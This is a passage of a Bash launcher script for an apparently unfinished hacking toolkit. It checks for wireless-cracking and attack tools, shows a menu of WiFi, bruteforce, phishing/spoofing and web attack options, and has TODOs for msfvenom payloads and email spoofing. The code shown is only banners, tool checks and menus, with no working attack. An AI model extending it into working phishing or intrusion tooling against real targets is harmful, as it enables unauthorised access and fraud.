#!/bin/bash

###########WARNING##########
#  SOME NOTES ARE SPANISH  #
############################

########################################################################################################################TODO
#! Añadir menu rapido con -h y -tree o algo asi xd
#! probe sniffer (prueba a ejecutarlo que es la primera pestaña de $(code), coño...)
#! wireshark reader (es facil, no me jodas cabron)

#TODO: Añadir handshakes automatizados (suicidio inminente)
    #! mirate el wifite puto vago de mierda
#TODO: Añadir al menu otros programas como zenmap, wireshark, metasploit (por donde los payloads), airgeddon o lscript.
#TODO: Añadir opción para crear payloads con msfvenom (tambien es facil coño).
#TODO: Wordlist generator with crunch
    # TODO: menu con distintas "plantillas" para crunch
# TODO: spoof email

#TODO: Ya si te quieres pegar un tiro en las pelotas te pones un ratito con el html :)

########################################################################################################################TODO

# if the user ctrl+c
# trap 'ctrlc;exit 1' 2

# Set the colors here beacause i don't wanna kill myself yet
normal_color="\e[1;0m"
green_color="\033[1;32m"
red_color="\033[1;31m"
red_color_slim="\033[0;031m"
blue_color="\033[1;34m"
cyan_color="\033[1;36m"
brown_color="\033[0;33m"
yellow_color="\033[1;33m"
pink_color="\033[1;35m"
white_color="\e[1;97m"

ACTUAL_FOLDER="$(pwd)"

###################################
#        INITIAL CHECKING         #
###################################

# First define the tools needed and the optional ones
essential_tools_names=(
						"ifconfig"
						"iwconfig"
						"iw"
						"airmon-ng"
						"airodump-ng"
						"aircrack-ng"
						"xterm"
						"ip"
                        "curl"
                        "awk"
					)

optional_tools_names=(
						"crunch"
						"aireplay-ng"
						"mdk4"
						"hashcat"
						"wash"
						"bully"
						"pixiewps"
						"john"
                        "msfconsole"
                        "msfvenom"
                        "hydra"
                        "rkhunter"
                        "tcpdump"
                        "sshpass"
                        "bettercap"
                        "reaver"
                        "nmap"
                        "kismet"
					)
# Declare the posible package names acording to the order before.
declare -A possible_package_names=(
									[${essential_tools_names[0]}]="net-tools" #ifconfig
									[${essential_tools_names[1]}]="wireless-tools" #iwconfig
									[${essential_tools_names[2]}]="iw" #iw
									[${essential_tools_names[3]}]="aircrack-ng" #airmon-ng
									[${essential_tools_names[4]}]="aircrack-ng" #airodump-ng
									[${essential_tools_names[5]}]="aircrack-ng" #aircrack-ng
									[${essential_tools_names[6]}]="xterm" #xterm
									[${essential_tools_names[7]}]="iproute2" #ip
                                    [${essential_tools_names[8]}]="curl" #curl
                                    [${essential_tools_names[9]}]="gawk" #awk
                                    #########################################################
									[${optional_tools_names[0]}]="crunch" #crunch
									[${optional_tools_names[1]}]="aircrack-ng" #aireplay-ng
									[${optional_tools_names[2]}]="mdk4" #mdk4
									[${optional_tools_names[3]}]="hashcat" #hashcat
									[${optional_tools_names[4]}]="reaver" #wash
									[${optional_tools_names[5]}]="bully" #bully
									[${optional_tools_names[6]}]="pixiewps" #pixiewps
									[${optional_tools_names[7]}]="john" #john
                                    [${optional_tools_names[8]}]="msfconsole" #metasploit
                                    [${optional_tools_names[9]}]="msfvenom" #msfvenom
                                    [${optional_tools_names[10]}]="hydra" #hydra
                                    [${optional_tools_names[11]}]="rkhunter" #rkhunter
                                    [${optional_tools_names[12]}]="tcpdump" #tcpdump
                                    [${optional_tools_names[13]}]="sshpass" #sshpass
                                    [${optional_tools_names[14]}]="bettercap" #bettercap
                                    [${optional_tools_names[15]}]="reaver" #reaver
                                    [${optional_tools_names[16]}]="nmap" #nmap
								)

# Check first tool names (essentials)
function check_essential_tools () {

    echo -e "${white_color} Checking essential tools...${normal_color}"

    essential_toolsok=1
	for i in "${essential_tools_names[@]}"; do
        echo -ne " ${i}"
        if ! hash "${i}" 2> /dev/null; then
            echo -ne "${red_color} Error${normal_color}"
            essential_toolsok=0
            echo -ne " (Posible name: ${possible_package_names[${i}]})"
            echo -e "\r"
        else
            echo -e "${green_color} Ok\r${normal_color}"
            essential_toolsok=1
        fi
	done

}

# Check second tool names (opyional)
function check_optional_tools () {

    echo -e "${white_color} Checking optional tools...${normal_color}"

    optional_toolsok=1
	for i in "${optional_tools_names[@]}"; do
        echo -ne " ${i}"
		if ! hash "${i}" 2> /dev/null; then
            echo -ne "${red_color} Error${normal_color}"
            echo -ne " (Posible name: ${possible_package_names[${i}]})"
            echo -e "\r"
			optional_toolsok=0
		else
			echo -e "${green_color} Ok\r${normal_color}"
			optional_tools[${i}]=1
		fi
	done

}

# Execute essential tools and optional tools functions
function check_all_tools () {

    check_essential_tools
    echo
    check_optional_tools
    echo
    echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
    read -p ""
    main_menu

}

# The press enter to concinue after checking that you are root
function check_tools_menu () {

    echo -e " ${white_color}Now the program will check if you have the requiered tools.${normal_color}"
    echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
    read -p ""
    echo
    check_all_tools

}

# executes whoami to see if the output is root or not
function check_root_permissions() {

	user=$(whoami)
	if [ "${user}" = "root" ]; then
		if [[ $continue_root=y ]]
		then
			echo
	        echo -e "${white_color} You have successfully logged in as root.${normal_color}"
	        echo
	        check_tools_menu
		elif [[ $continue_root=n ]]
		then
			echo
	        echo -e "${white_color} You have successfully logged in as root.${normal_color}"
	        echo
		fi
	else
		echo
		echo -e "${white_color} You are not ${red_color}root${white_color}! You must be ${red_color}root${white_color} to run this script."
        echo -e "${white_color} You can type ${red_color_slim}su -${white_color} to be ${red_color}root${white_color}."
        echo
        echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
	fi
}

###################################
#              MENU               #
###################################

# display of the main menu, first with the banner
function main_menu () {
    # trap 'ctrlc;exit 1' 2
    clear
    banner

    echo -e "${red_color_slim}  ins)${white_color} Install the missing packages"
    echo -e " ${white_color}╞${normal_color}═════════════════════════════════════${white_color}╡${normal_color}"
    echo -e "${red_color_slim}   if)${white_color} ifconfig"
    echo -e "${red_color_slim}   └─ lIP)${white_color} See just local IP"
    echo -e "${red_color_slim}   iw)${white_color} iwconfig"
    echo -e "${red_color_slim}  pIP)${white_color} Public IP"
    echo -e "${red_color_slim}  mon)${white_color} Monitor mode"
    echo -e "${red_color_slim}   └─ cmm)${white_color} [ChannelMonitorMode] Monitor mode with custom channel"
    echo -e "${red_color_slim}  man)${white_color} Managed mode"
    echo -e "${red_color_slim}  scn)${white_color} Scan near networks"
    echo -e "${red_color_slim}  png)${white_color} Ping an IP"
    echo -e " ${white_color}╞${normal_color}═════════════════════════════════════${white_color}╡${normal_color}"
    echo -e "${red_color_slim}  001)${white_color} WiFi menu"
    echo -e "${red_color_slim}  002)${white_color} Nmap scanning menu"
    echo -e "${red_color_slim}  003)${white_color} Bruteforce menu"
    echo -e "${red_color_slim}  004)${white_color} Phishing/Spoofing menu"
	echo -e "${red_color_slim}  005)${white_color} Web attack menu"
    echo -e "${red_color_slim}  006)${white_color} Scan your pc with rkhunter"
    echo -e "${red_color_slim}  007)${white_color} [SSH] Raspberry pi menu"
    echo -e " ${white_color}╞${normal_color}═════════════════════════════════════${white_color}╡${normal_color}"
    echo -e "${red_color_slim}   cr)${white_color} Credits and mentions"
    echo -e "${red_color_slim}  000)${normal_color} Exit"

    echo
    echo -ne "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read option
    check_option
}

function check_option () {
    if [[ $option = 0 || $option = 000 || $option = "exit" ]]
    then
        exit_animation

    elif [[ $option = "ins" || $option  = "INS" ]]; then
        install_tools

    elif [[ $option = "if" || $option  = "IF" ]]; then
        if_option

    elif [[ $option = "lip" || $option  = "lIP" ]]; then
        just_local_ip

    elif [[ $option = "iw" || $option  = "IW" ]]; then
        iw_option

    elif [[ $option = "pIP" || $option  = "pip" ]]; then
        public_ip

    elif [[ $option = "mon" || $option  = "MON" ]]; then
        monitor_mode

    elif [[ $option = "cmm" || $option  = "CMM" ]]; then
        monitor_mode_custom_channel

    elif [[ $option = "man" || $option  = "MAN" ]]; then
        managed_mode

    elif [[ $option = "scn" || $option  = "SCN" ]]; then
        scan_networks

    elif [[ $option = "png" || $option  = "PNG" ]]; then
        ping_ip

    elif [[ $option = "cr" || $option  = "CR" ]]; then
        credits

    elif [[ $option = 1 || $option  = 001 ]]; then
        global_wifi_menu

    elif [[ $option = 2 || $option  = 002 ]]; then
        scanning_menu

    elif [[ $option = 3 || $option  = 003 ]]; then
        bruteforce_menu

    elif [[ $option = 4 || $option  = 004 ]]; then
        spoof_menu

	elif [[ $option = 5 || $option  = 005 ]]; then
        web_attack_menu

    elif [[ $option = 6 || $option  = 006 ]]; then
        rkhunter_scan

    elif [[ $option = 7 || $option  = 007 ]]; then
        raspi_menu

    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        main_menu
    fi

}

###################################
#             BANNERS            #
###################################

# banner without animation
function banner () {

    echo -e "${white_color}╭─────────────────────────────────────────────────────────────────────────────────────╮${normal_color}"
    echo -e "               ${red_color}(\`-')${white_color}                ${red_color}(\`-')${white_color}                              "
    echo -e "            ${red_color}<-.(OO )${white_color}               ${red_color}_(OO )${white_color}                  ${red_color}<-.${white_color}         "
    echo -e "            ,------,${red_color})${white_color}   .---. ,--.${red_color}(_/${white_color},-.${red_color}\ ${white_color}.--.  .----.   ,--. ${red_color})${white_color}   .--. "
    echo -e "            |   /\`. '  / .  | \   \ / ${red_color}(_/${white_color}/_  | /  ..  \  |  ${red_color}(\`-')${white_color}/_  | "
    echo -e "            |  |_.' | / /|  |  \   /   /  |  ||  /  \  . |  |${red_color}OO )${white_color} |  | "
    echo -e "            |  .   .'/ '-'  |   \     /${red_color}_)${white_color} |  |'  \  /  '${red_color}(${white_color}|  '__ ${red_color}|${white_color} |  | "
    echo -e "            |  |\  \ \`---|  |    \   /    |  | \  \`'  /  |     |${red_color}'${white_color} |  | "
    echo -e "   ＴＥＨ   \`--' '--'    \`--'     \`-'     \`--'  \`---''   \`-----'  \`--'   ＳＣＲＩＰＴ${normal_color}"
    echo -e "${white_color}╰─────────────────────────────────────────────────────────────────────────────────────╯${normal_color}"
    echo
}
# banner animation
function banner_animation () {
    clear
    echo -e "${white_color}╭─────────────────────────────────────────────────────────────────────────────────────╮${normal_color}"
    echo -e "               ${red_color}(\`-')${white_color}                ${red_color}(\`-')${white_color}                              "
    echo -e "            ${red_color}<-.(OO )${white_color}               ${red_color}_(OO )${white_color}                  ${red_color}<-.${white_color}         "
    echo -e "            ,------,${red_color})${white_color}   .---. ,--.${red_color}(_/${white_color},-.${red_color}\ ${white_color}.--.  .----.   ,--. ${red_color})${white_color}   .--. "
    echo -e "            |   /\`. '  / .  | \   \ / ${red_color}(_/${white_color}/_  | /  ..  \  |  ${red_color}(\`-')${white_color}/_  | "
    echo -e "            |  |_.' | / /|  |  \   /   /  |  ||  /  \  . |  |${red_color}OO )${white_color} |  | "
    echo -e "            |  .   .'/ '-'  |   \     /${red_color}_)${white_color} |  |'  \  /  '${red_color}(${white_color}|  '__ ${red_color}|${white_color} |  | "
    echo -e "            |  |\  \ \`---|  |    \   /    |  | \  \`'  /  |     |${red_color}'${white_color} |  | "
    echo -e "   ＴＥＨ   \`--' '--'    \`--'     \`-'     \`--'  \`---''   \`-----'  \`--'   ＳＣＲＩＰＴ"
    echo -e "${white_color}╰─────────────────────────────────────────────────────────────────────────────────────╯${normal_color}"
    sleep 1
    clear
    echo -e "${white_color}╭─────────────────────────────────────────────────────────────────────────────────────╮${normal_color}"
    echo -e "               ${red_color}(\`-')${white_color}                ${red_color}(\`-')${white_color}                              "
    echo -e "            ${red_color}<-.(-- )${white_color}               ${red_color}_(-- )${white_color}                  ${red_color}<-.${white_color}         "
    echo -e "            ,------,${red_color})${white_color}   .---. ,--.${red_color}(_/${white_color},-.${red_color}\ ${white_color}.--.  .----.   ,--. ${red_color})${white_color}   .--. "
    echo -e "            |   /\`. '  / .  | \   \ / ${red_color}(_/${white_color}/_  | /  ..  \  |  ${red_color}(\`-')${white_color}/_  | "
    echo -e "            |  |_.' | / /|  |  \   /   /  |  ||  /  \  . |  |${red_color}-- )${white_color} |  | "
    echo -e "            |  .   .'/ '-'  |   \     /${red_color}_)${white_color} |  |'  \  /  '${red_color}(${white_color}|  '__ ${red_color}|${white_color} |  | "
    echo -e "            |  |\  \ \`---|  |    \   /    |  | \  \`'  /  |     |${red_color}'${white_color} |  | "
    echo -e "   ＴＥＨ   \`--' '--'    \`--'     \`-'     \`--'  \`---''   \`-----'  \`--'   ＳＣＲＩＰＴ"
    echo -e "${white_color}╰─────────────────────────────────────────────────────────────────────────────────────╯${normal_color}"
    sleep 0.1
    clear
    echo -e "${white_color}╭─────────────────────────────────────────────────────────────────────────────────────╮${normal_color}"
    echo -e "               ${red_color}(\`-')${white_color}                ${red_color}(\`-')${white_color}                              "
    echo -e "            ${red_color}<-.(OO )${white_color}               ${red_color}_(OO )${white_color}                  ${red_color}<-.${white_color}         "
    echo -e "            ,------,${red_color})${white_color}   .---. ,--.${red_color}(_/${white_color},-.${red_color}\ ${white_color}.--.  .----.   ,--. ${red_color})${white_color}   .--. "
    echo -e "            |   /\`. '  / .  | \   \ / ${red_color}(_/${white_color}/_  | /  ..  \  |  ${red_color}(\`-')${white_color}/_  | "
    echo -e "            |  |_.' | / /|  |  \   /   /  |  ||  /  \  . |  |${red_color}OO )${white_color} |  | "
    echo -e "            |  .   .'/ '-'  |   \     /${red_color}_)${white_color} |  |'  \  /  '${red_color}(${white_color}|  '__ ${red_color}|${white_color} |  | "
    echo -e "            |  |\  \ \`---|  |    \   /    |  | \  \`'  /  |     |${red_color}'${white_color} |  | "
    echo -e "   ＴＥＨ   \`--' '--'    \`--'     \`-'     \`--'  \`---''   \`-----'  \`--'   ＳＣＲＩＰＴ"
    echo -e "${white_color}╰─────────────────────────────────────────────────────────────────────────────────────╯${normal_color}"
    sleep 0.2
    clear
    echo -e "${white_color}╭─────────────────────────────────────────────────────────────────────────────────────╮${normal_color}"
    echo -e "               ${red_color}(\`-')${white_color}                ${red_color}(\`-')${white_color}                              "
    echo -e "            ${red_color}<-.(-- )${white_color}               ${red_color}_(-- )${white_color}                  ${red_color}<-.${white_color}         "
    echo -e "            ,------,${red_color})${white_color}   .---. ,--.${red_color}(_/${white_color},-.${red_color}\ ${white_color}.--.  .----.   ,--. ${red_color})${white_color}   .--. "
    echo -e "            |   /\`. '  / .  | \   \ / ${red_color}(_/${white_color}/_  | /  ..  \  |  ${red_color}(\`-')${white_color}/_  | "
    echo -e "            |  |_.' | / /|  |  \   /   /  |  ||  /  \  . |  |${red_color}-- )${white_color} |  | "
    echo -e "            |  .   .'/ '-'  |   \     /${red_color}_)${white_color} |  |'  \  /  '${red_color}(${white_color}|  '__ ${red_color}|${white_color} |  | "
    echo -e "            |  |\  \ \`---|  |    \   /    |  | \  \`'  /  |     |${red_color}'${white_color} |  | "
    echo -e "   ＴＥＨ   \`--' '--'    \`--'     \`-'     \`--'  \`---''   \`-----'  \`--'   ＳＣＲＩＰＴ"
    echo -e "${white_color}╰─────────────────────────────────────────────────────────────────────────────────────╯${normal_color}"
    sleep 0.1
    clear
    echo -e "${white_color}╭─────────────────────────────────────────────────────────────────────────────────────╮${normal_color}"
    echo -e "               ${red_color}(\`-')${white_color}                ${red_color}(\`-')${white_color}                              "
    echo -e "            ${red_color}<-.(OO )${white_color}               ${red_color}_(OO )${white_color}                  ${red_color}<-.${white_color}         "
    echo -e "            ,------,${red_color})${white_color}   .---. ,--.${red_color}(_/${white_color},-.${red_color}\ ${white_color}.--.  .----.   ,--. ${red_color})${white_color}   .--. "
    echo -e "            |   /\`. '  / .  | \   \ / ${red_color}(_/${white_color}/_  | /  ..  \  |  ${red_color}(\`-')${white_color}/_  | "
    echo -e "            |  |_.' | / /|  |  \   /   /  |  ||  /  \  . |  |${red_color}OO )${white_color} |  | "
    echo -e "            |  .   .'/ '-'  |   \     /${red_color}_)${white_color} |  |'  \  /  '${red_color}(${white_color}|  '__ ${red_color}|${white_color} |  | "
    echo -e "            |  |\  \ \`---|  |    \   /    |  | \  \`'  /  |     |${red_color}'${white_color} |  | "
    echo -e "   ＴＥＨ   \`--' '--'    \`--'     \`-'     \`--'  \`---''   \`-----'  \`--'   ＳＣＲＩＰＴ"
    echo -e "${white_color}╰─────────────────────────────────────────────────────────────────────────────────────╯${normal_color}"
    sleep 0.5
    echo
	continue_root=y
    check_root_permissions
}
# 000) exit animation'
function exit_animation () {

    clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}x${red_color}\ ),-','${white_color}x${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}b  y  e  !"
        sleep 0.5
        clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}X${red_color}\ ),-','${white_color}X${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}b  y  e  !"
        sleep 0.1
        clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}x${red_color}\ ),-','${white_color}x${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}B  y  e  !"
        sleep 0.1
        clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}X${red_color}\ ),-','${white_color}X${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}b  Y  e  !"
        sleep 0.1
        clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}x${red_color}\ ),-','${white_color}x${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}b  y  E  !"
        sleep 0.1
        clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}X${red_color}\ ),-','${white_color}X${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}b  Y  e  !"
        sleep 0.1
        clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}x${red_color}\ ),-','${white_color}x${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}B  y  e  !"
        sleep 0.1
        clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}X${red_color}\ ),-','${white_color}X${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}B  Y  e  !"
        sleep 0.1
        clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}x${red_color}\ ),-','${white_color}x${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}B  Y  E  !"
        sleep 0.1
        clear
        echo
        echo -e "${red_color}          (                      ) "
        echo -e "          |\    _,--------._    / | "
        echo -e "          | \`.,'            \`. /  | "
        echo -e "          \`  '              ,-'   ' "
        echo -e "           \/_         _   (     / "
        echo -e "          (,-.\`.    ,',-.\`. \`__,' "
        echo -e "           |/${white_color}X${red_color}\ ),-','${white_color}X${red_color}\`= ,'.\` | "
        echo -e "           \`._/)  -'.\_,'   ) ))|"
        echo -e "           /  (_.)\     .   -'//"
        echo -e "          (  /\____/\    ) )\`'\ "
        echo -e "           \ |V----V||  ' ,    \ "
        echo -e "            |\`- -- -'   ,'   \  \      _____"
        echo -e "     ___    |         .'    \ \  \`._,-'     \`- "
        echo -e "        \`.__,\`---^---'       \ \` -' "
        echo -e "           -.______  \ . /  ______,- "
        echo -e "                   \`.     ,'            "
        echo
        echo -e "                  ${white_color}B  Y  E  !${normal_color}"
        echo
        sleep 1
        clear
        exit 0

}
# shhhhhh, it's not metasploit
function pantalla_de_carga () {

    clear
    sleep 0.1
    echo -e "${green_color} [+] ${white_color}loading  - "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loading  / "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loading  | "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}Loading  \ "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}lOading  - "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loAding  / "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loaDing  | "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loadIng  \ "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loadiNg  - "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loadinG  / "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loading  | "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loading  \ "
    clear
    sleep 0.1
    echo -e "${green_color} [+] ${white_color}loading  - "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loading  / "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loading  | "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}Loading  \ "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}lOading  - "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loAding  / "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loaDing  | "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loadIng  \ "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loadiNg  - "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loadinG  / "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loading  | "
    sleep 0.1
    clear
    echo -e "${green_color} [+] ${white_color}loading  \ "
    clear

}

###################################
#        MENU FUNCTIONS           #
###################################

# ins
function install_tools () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} Install tools menu ${red_color_slim}]${normal_color}"
    echo
    echo -e " ${white_color}[${normal_color}==========================${white_color}]${normal_color}"
    echo -e "${white_color}  01) ${normal_color}Install all${normal_color}"
    echo -e " ${white_color}[${normal_color}======${white_color}essential-tools${normal_color}=====${white_color}]${normal_color}"
    echo -e "${white_color}  02) ${normal_color}net-tools${normal_color}"
    echo -e "${white_color}  03) ${normal_color}wireless-tools${normal_color}"
    echo -e "${white_color}  04) ${normal_color}iw${normal_color}"
    echo -e "${white_color}  05) ${normal_color}aircrack-ng${normal_color}"
    echo -e "${white_color}  06) ${normal_color}reaver${normal_color}"
    echo -e "${white_color}  07) ${normal_color}nmap${normal_color}"
    echo -e "${white_color}  08) ${normal_color}xterm${normal_color}"
    echo -e "${white_color}  09) ${normal_color}iproute2${normal_color}"
    echo -e "${white_color}  10) ${normal_color}curl${normal_color}"
    echo -e "${white_color}  11) ${normal_color}awk (gawk)${normal_color}"
    echo -e " ${white_color}[${normal_color}======${white_color}optional-tools${normal_color}======${white_color}]${normal_color}"
    echo -e "${white_color}  12) ${normal_color}crunch${normal_color}"
    echo -e "${white_color}  13) ${normal_color}mdk4${normal_color}"
    echo -e "${white_color}  14) ${normal_color}hashcat${normal_color}"
    echo -e "${white_color}  15) ${normal_color}bully${normal_color}"
    echo -e "${white_color}  16) ${normal_color}pixiewps${normal_color}"
    echo -e "${white_color}  17) ${normal_color}john${normal_color}"
    echo -e "${white_color}  18) ${normal_color}metasploit${normal_color}"
    echo -e "${white_color}  19) ${normal_color}msfvenom${normal_color}"
    echo -e "${white_color}  19) ${normal_color}hydra${normal_color}"
    echo -e "${white_color}  20) ${normal_color}rkhunter${normal_color}"
    echo -e "${white_color}  21) ${normal_color}tcpdump${normal_color}"
    echo -e "${white_color}  22) ${normal_color}sshpass${normal_color}"
    echo -e "${white_color}  23) ${normal_color}blackeye${normal_color}"
    echo -e "${white_color}  24) ${normal_color}bettercap${normal_color}"
    echo -e "${white_color}  25) ${normal_color}routersploit${normal_color}"
    echo -e "${white_color}  26) ${normal_color}kismet${normal_color}"

    echo -e " ${white_color}[${normal_color}==========================${white_color}]${normal_color}"
    echo -e "${normal_color}  00)${normal_color} Back${normal_color}"
    echo
    echo -e "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read install_option
    clear
    echo

